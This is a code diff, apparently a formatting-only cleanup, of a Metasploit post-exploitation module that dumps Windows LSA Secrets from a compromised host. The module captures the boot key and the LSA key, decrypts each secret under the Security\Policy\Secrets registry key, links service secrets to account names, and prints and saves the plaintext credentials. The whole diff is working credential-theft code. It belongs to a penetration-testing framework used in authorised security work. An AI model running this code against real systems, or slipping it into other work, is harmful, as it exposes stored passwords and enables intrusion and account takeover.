@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -13,21 +14,19 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'            => "Windows Enumerate LSA Secrets",
-      'Description'     => %q{
-        This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
-        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
-        code from cachedump.
-        },
-      'License'         => MSF_LICENSE,
-      'Platform'        => ['win'],
-      'SessionTypes'    => ['meterpreter'],
-      'Author'          => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']
-    ))
+                      'Name'            => "Windows Enumerate LSA Secrets",
+                      'Description'     => %q(
+                        This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
+                        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
+                        code from cachedump.
+                        ),
+                      'License'         => MSF_LICENSE,
+                      'Platform'        => ['win'],
+                      'SessionTypes'    => ['meterpreter'],
+                      'Author'          => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']))
   end
-
 
   # Decrypted LSA key is passed into this method
   def get_secret(lsa_key)
@@ -40,7 +39,7 @@ class MetasploitModule < Msf::Post
     secrets = registry_enumkeys(root_regkey)
 
     secrets.each do |secret_regkey|
-      sk_arr = registry_enumkeys(root_regkey + "\\" +  secret_regkey)
+      sk_arr = registry_enumkeys(root_regkey + "\\" + secret_regkey)
       next unless sk_arr
 
       sk_arr.each do |mkeys|
@@ -59,16 +58,16 @@ class MetasploitModule < Msf::Post
           decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
         else
           # and here
-          if sysinfo['Architecture'] == ARCH_X64
-            encrypted_secret = encrypted_secret[0x10..-1]
-          else # 32 bits
-            encrypted_secret = encrypted_secret[0xC..-1]
-          end
+          encrypted_secret = if sysinfo['Architecture'] == ARCH_X64
+                               encrypted_secret[0x10..-1]
+                             else # 32 bits
+                               encrypted_secret[0xC..-1]
+                             end
 
           decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
         end
 
-        next unless decrypted.length > 0
+        next if decrypted.empty?
 
         # axe all the non-printables
         decrypted = decrypted.scan(/[[:print:]]/).join
@@ -78,32 +77,31 @@ class MetasploitModule < Msf::Post
           # with name "yourmom". Strip off the "_SC_" to get something
           # we can lookup in the list of services to find out what
           # account this secret is associated with.
-          svc_name = secret_regkey[4,secret_regkey.length]
+          svc_name = secret_regkey[4, secret_regkey.length]
           svc_user = registry_getvaldata(services_key + svc_name, "ObjectName")
 
           # if the unencrypted value is not blank and is a service, print
           print_good("Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n")
-          output  << "Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n"
+          output << "Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n"
         else
           # if the unencrypted value is not blank, print
           print_good("Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n")
-          output  << "Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n"
+          output << "Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n"
         end
       end
     end
 
-    return output
+    output
   end
 
   # The sauce starts here
   def run
-
     hostname = sysinfo['Computer']
     print_status("Executing module against #{hostname}")
 
     print_status('Obtaining boot key...')
     bootkey = capture_boot_key
-    vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")
+    vprint_status("Boot key: #{bootkey.unpack('H*')[0]}")
 
     print_status('Obtaining Lsa key...')
     lsa_key = capture_lsa_key(bootkey)
@@ -111,7 +109,7 @@ class MetasploitModule < Msf::Post
       print_error("Could not retrieve LSA key. Are you SYSTEM?")
       return
     end
-    vprint_status("Lsa Key: #{lsa_key.unpack("H*")[0]}")
+    vprint_status("Lsa Key: #{lsa_key.unpack('H*')[0]}")
 
     secrets = hostname + get_secret(lsa_key)
 
@@ -124,8 +122,8 @@ class MetasploitModule < Msf::Post
       secrets,
       'reg_lsa_secrts.txt',
       'Registry LSA Secret Decrypted File'
-      )
+    )
 
-      print_status("Data saved in: #{path}")
+    print_status("Data saved in: #{path}")
   end
 end
